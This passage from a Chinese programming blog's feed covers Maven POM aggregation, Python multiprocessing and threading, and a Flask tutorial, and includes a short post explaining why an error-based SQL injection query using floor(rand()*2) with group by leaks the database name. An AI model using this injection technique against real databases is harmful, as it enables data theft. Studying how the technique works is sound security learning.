https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--由于不是继承，所以必须重新添加 groupId 和 version--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>App-Data-lib<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--定义依赖管理--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--导入依赖管理配置--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Root<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--依赖范围为 import--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--类型一般为pom--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--声明依赖--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h4><p>如果你想要将本项目和某些模块一起打包的时候就可以使用聚合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--添加需要聚合的模块--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">modules</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">module</span>&gt;</span>../App-Core-lib<span class="hljs-tag">&lt;/<span class="hljs-name">module</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">module</span>&gt;</span>../App-Data-lib<span class="hljs-tag">&lt;/<span class="hljs-name">module</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">module</span>&gt;</span>../App-UI-WAR<span class="hljs-tag">&lt;/<span class="hljs-name">module</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">modules</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>mvn clean install</p></blockquote><p>使用上面这个命令进行打包</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-9.png" alt="Maven 聚合"></p><p>从上图可以发现其他的模块也一起打包了</p><h4 id="pluginManagement"><a href="#pluginManagement" class="headerlink" title="pluginManagement"></a>pluginManagement</h4><h4 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h4><h4 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h4><h4 id="私服"><a href="#私服" class="headerlink" title="私服"></a>私服</h4><h3 id="Maven命令"><a href="#Maven命令" class="headerlink" title="Maven命令"></a>Maven命令</h3><ul><li><p>mvn help:effective-pom  查看Super POM的默认值</p></li><li><p>mvn clean package  对项目进行打包构建</p></li><li><p>mvn clean compile 对目标项目进行编译</p></li><li><p>mvn install 构建阶段</p></li><li><p>mvn [插件名]:[目标名] </p><ul><li><p>maven-compiler-plugin 插件的 compile 目标，命令如下</p></li><li><blockquote><p>mvn compiler:compile</p></blockquote></li></ul></li><li><p>mvn site 生成项目的站点(让别人以网站的形式来了解这个项目,在target\site目录下)</p></li><li><p>mvn archetype:generate 快速创建maven项目</p><ul><li>然后他会让你选择版本</li><li>让你输入groupId,artifactId,version,package</li></ul></li><li><p>mvn help:describe -Dplugin&#x3D;invoker 使用这个命令来进行自动打包</p></li><li><p>mvn dependency:list 查看使用的依赖列表</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Maven</tag>
      
      <tag>Java</tag>
      
      <tag>打包工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>group by和rand造成的报错原理</title>
    <link href="/2022/01/14/group-by%E5%92%8Crand%E9%80%A0%E6%88%90%E7%9A%84%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86/"/>
    <url>/2022/01/14/group-by%E5%92%8Crand%E9%80%A0%E6%88%90%E7%9A%84%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h1><p>首先从报错导致的语句开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;<br></code></pre></td></tr></table></figure><p>这个语句会导致报错,至于报什么错呢…看下面</p><blockquote><p>ERROR 1062 (23000): Duplicate entry ‘::security::0’ for key ‘<group_key>‘</group_key></p></blockquote><p>这句话的意思是有两个主键</p><p>这时我猜想,group by时可能会创建一个虚表,然后使用后面的字段来当作主键,但是这种(如下):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select 1,2 from information_schema.columns group by a;<br></code></pre></td></tr></table></figure><p>就不会报错,所以我猜想可能和聚合函数一起使用的时候才会有主键</p><p>这时我把语句稍作修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(*),2 from information_schema.columns group by floor(rand()*2);<br></code></pre></td></tr></table></figure><p>发现这样就是最简的报错语句</p><p>那么再说他是怎么报错的.</p><p>这篇文章就很好啊~~~</p><p>:smirk:</p><p><a href="https://blog.csdn.net/weixin_31481495/article/details/113229331">https://blog.csdn.net/weixin_31481495/article/details/113229331</a></p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-进程！线程！！协程！！！</title>
    <link href="/2022/01/13/Python-%E8%BF%9B%E7%A8%8B%EF%BC%81%E7%BA%BF%E7%A8%8B%EF%BC%81%EF%BC%81%E5%8D%8F%E7%A8%8B%EF%BC%81%EF%BC%81%EF%BC%81/"/>
    <url>/2022/01/13/Python-%E8%BF%9B%E7%A8%8B%EF%BC%81%E7%BA%BF%E7%A8%8B%EF%BC%81%EF%BC%81%E5%8D%8F%E7%A8%8B%EF%BC%81%EF%BC%81%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<h1 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h1><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>一个程序可以有多个进程,但是每个进程至少有一个线程,在多核CPU下每个核可以操作一个进程,这样就可以达到进程的并发</p><p>python在Linux&#x2F;Unix可是直接使用foke()</p><blockquote><p>注意了别的函数一般是调用一次返回一次结果,而这个是调用一次返回两次结果</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Process (%s) start...&#x27;</span> % os.getpid())<br><span class="hljs-comment"># Only works on Unix/Linux/Mac:</span><br>pid = os.fork()<br><span class="hljs-keyword">if</span> pid == <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I am child process (%s) and my parent is %s.&#x27;</span> % (os.getpid(), os.getppid()))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I (%s) just created a child process (%s).&#x27;</span> % (os.getpid(), pid))<br></code></pre></td></tr></table></figure><p>运行结果如下</p><blockquote><p>Process (876) start…<br>I (876) just created a child process (877).<br>I am child process (877) and my parent is 876.</p></blockquote><p>而在Windows下需要使用multiprocessing来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 子进程要执行的代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_proc</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run child process %s (%s)...&#x27;</span> % (name, os.getpid()))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())<br>    p = Process(target=run_proc, args=(<span class="hljs-string">&#x27;test&#x27;</span>,))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process will start.&#x27;</span>)<br>    p.start()<br>    p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process end.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>需要一个运行的函数</p><p>或者使用进程池</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><span class="hljs-keyword">import</span> os, time, random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">long_time_task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run task %s (%s)...&#x27;</span> % (name, os.getpid()))<br>    start = time.time()<br>    time.sleep(random.random() * <span class="hljs-number">3</span>)<br>    end = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Task %s runs %0.2f seconds.&#x27;</span> % (name, (end - start)))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())<br>    p = Pool(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        p.apply_async(long_time_task, args=(i,))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Waiting for all subprocesses done...&#x27;</span>)<br>    p.close()<br>    p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;All subprocesses done.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>进程的输入输出管道</p><p>首先是输出管道subprocess</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;$ nslookup www.python.org&#x27;</span>)<br>r = subprocess.call([<span class="hljs-string">&#x27;nslookup&#x27;</span>, <span class="hljs-string">&#x27;www.python.org&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exit code:&#x27;</span>, r)<br></code></pre></td></tr></table></figure><p>这个作用是开启一个子进程然后执行 nslookup <a href="http://www.python.org的意思/">www.python.org的意思</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;$ nslookup&#x27;</span>)<br><span class="hljs-comment"># subprocess.PIPE的意思是代表这些管道要开放</span><br>p = subprocess.Popen([<span class="hljs-string">&#x27;nslookup&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br>output, err = p.communicate(<span class="hljs-string">b&#x27;set q=mx\npython.org\nexit\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(output.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exit code:&#x27;</span>, p.returncode)<br></code></pre></td></tr></table></figure><p>开启一个进程,关于执行nslookup的并且开启输入,输出,错误管道给变量p</p><p>在用p的communicate来进行输入命令最后返回输出和错误结果</p><figure class="highlight plaintext"><figcaption><span>nslookup</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs $">默认服务器:  UnKnown<br>Address:  192.168.10.254<br><br>&gt; &gt; 服务器:  UnKnown<br>Address:  192.168.10.254<br><br>python.orgMX preference = 50, mail exchanger = mail.python.org<br>&gt; <br></code></pre></td></tr></table></figure><p>运行结果上面是:</p><p>在这里进程间的通信可以使用queue来进行</p><blockquote><p>在Unix&#x2F;Linux下，<code>multiprocessing</code>模块封装了<code>fork()</code>调用，使我们不需要关注<code>fork()</code>的细节。由于Windows没有<code>fork</code>调用，因此，<code>multiprocessing</code>需要“模拟”出<code>fork</code>的效果，父进程所有Python对象都必须通过pickle序列化再传到子进程去，所以，如果<code>multiprocessing</code>在Windows下调用失败了，要先考虑是不是pickle失败了。</p></blockquote><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>是操作系统能够管理的最小运算单位,由于一个进程只能丢给一个核心处理。所以就算多线程也是最高的速度也是单核并发(但是在CPU空闲情况下是可以并行的)</p><p>普通的多线程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, threading<br><br><span class="hljs-comment"># 新线程执行的代码:</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newPrint</span>():<br>    <span class="hljs-built_in">print</span>(threading.current_thread(),<span class="hljs-string">&quot;--------------------&quot;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>threadList=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    t = threading.Thread(target=newPrint,name=i)<br>    t.start()<br>    threadList.append(t)<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> threadList:<br>    j.join()<br><br></code></pre></td></tr></table></figure><p>用Lock来进行加锁</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, threading<br><br>balance =<span class="hljs-number">0</span><br>lock = threading.Lock()<br><span class="hljs-comment"># 新线程执行的代码:</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newPrint</span>():<br>    <span class="hljs-keyword">global</span> balance<br>    lock.acquire()<br>    balance += <span class="hljs-number">1</span><br>    balance -= <span class="hljs-number">3</span><br>    balance += <span class="hljs-number">1</span><br>    lock.release()<br>    <span class="hljs-built_in">print</span>(balance)<br>threadList=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    t = threading.Thread(target=newPrint,name=i)<br>    t.start()<br>    threadList.append(t)<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> threadList:<br>    j.join()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----结束------&quot;</span>)<br></code></pre></td></tr></table></figure><p>防止balance变量被意外修改</p><p>当我们需要为每个线程创建一个变量时可以使用dict还可以使用</p><p>ThreadLocal</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br>    <br><span class="hljs-comment"># 创建全局ThreadLocal对象:</span><br>local_school = threading.local()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_student</span>():<br>    <span class="hljs-comment"># 获取当前线程关联的student:</span><br>    std = local_school.student<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, %s (in %s)&#x27;</span> % (std, threading.current_thread().name))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_thread</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-comment"># 绑定ThreadLocal的student:</span><br>    local_school.student = name<br>    process_student()<br><br>t1 = threading.Thread(target= process_thread, args=(<span class="hljs-string">&#x27;Alice&#x27;</span>,), name=<span class="hljs-string">&#x27;Thread-A&#x27;</span>)<br>t2 = threading.Thread(target= process_thread, args=(<span class="hljs-string">&#x27;Bob&#x27;</span>,), name=<span class="hljs-string">&#x27;Thread-B&#x27;</span>)<br>t1.start()<br>t2.start()<br>t1.join()<br>t2.join()<br></code></pre></td></tr></table></figure><p>一个<code>ThreadLocal</code>变量虽然是全局变量，但每个线程都只能读写自己线程的独立副本，互不干扰。<code>ThreadLocal</code>解决了参数在一个线程中各个函数之间互相传递的问题。</p><blockquote><p><code>ThreadLocal</code>最常用的地方就是为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便地访问这些资源。</p></blockquote><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程是单进程单线程的超越函数的调度机制，它通过一定的调度手段进行调度。3.协程不是未来（反驳赖勇浩）。协程是很早之前就有的。很早之前，windows就有纤程的概念，Linux不太确定。但是它一直作为小众的API而存在。协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行），这样带来的好处是性能大幅度的提升，因为不会像线程切换那样消耗资源。协程不是进程也不是线程，而是<strong>一个特殊的函数</strong>，这个函数可以在某个地方挂起，并且可以重新在挂起处外继续运行。所以说，协程与进程、线程相比并不是一个维度的概念。  (一定是串行处理)</p><p>​</p>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask搭建网站</title>
    <link href="/2022/01/13/Flask%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"/>
    <url>/2022/01/13/Flask%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>安装环境</p><p>pip install flask</p><p>pip install Jinjia2</p><p>创建python环境的项目</p><p>然后创建python文件，并设置Flask环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__,<br>            static_url_path=<span class="hljs-string">&#x27;/static&#x27;</span>,<span class="hljs-comment">#静态文件路径</span><br>            static_folder=<span class="hljs-string">&#x27;static&#x27;</span>,<br>            template_folder=<span class="hljs-string">&#x27;templages&#x27;</span> <span class="hljs-comment">#模板文件</span><br>            )<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><h4 id="普通路由"><a href="#普通路由" class="headerlink" title="普通路由"></a>普通路由</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wodiu&quot;</span><br></code></pre></td></tr></table></figure><p>这是普通的路由添加方式</p><h4 id="带参数路由"><a href="#带参数路由" class="headerlink" title="带参数路由"></a>带参数路由</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/aa/&lt;user_id&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aaaa</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wodiu %s&quot;</span>%(user_id)<br></code></pre></td></tr></table></figure><p>或者使用下面这种方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/aa&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ccccc</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wodiu %s&quot;</span>%(request.args[<span class="hljs-string">&#x27;aaa&#x27;</span>])<br></code></pre></td></tr></table></figure><p>关于flask.request</p><p><a href="https://blog.csdn.net/u011146423/article/details/88191225">https://blog.csdn.net/u011146423/article/details/88191225</a></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/flask-1.png" alt="image-20220113152615716"></p><h3 id="访问方法设置"><a href="#访问方法设置" class="headerlink" title="访问方法设置"></a>访问方法设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/sss&quot;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">a_page</span>():<br>    user_name = request.form.get(<span class="hljs-string">&#x27;uname&#x27;</span>)<br>    user_pass = request.form.get(<span class="hljs-string">&#x27;upass&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;this is a page %s --- %s  hahahaha&quot;</span>%(user_name,user_pass)<br></code></pre></td></tr></table></figure><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><h4 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h4><p>首先新建templates(最开始定义的环境名称)</p><p>然后新建tempa.html,然后代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br> <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>i am father temp1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>&#123;% block contentBlock %&#125;<br> <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>father html temp2<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endblock %&#125;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>i am father temp last3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>子页面定义如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% extends &#x27;tempa.html&#x27; %&#125;<br><br>&#123;% block contentBlock %&#125;<br><br>&#123;&#123;super()&#125;&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>zi mo ban -------&#123;&#123;ida&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br>&#123;% endblock %&#125;<br></code></pre></td></tr></table></figure><h4 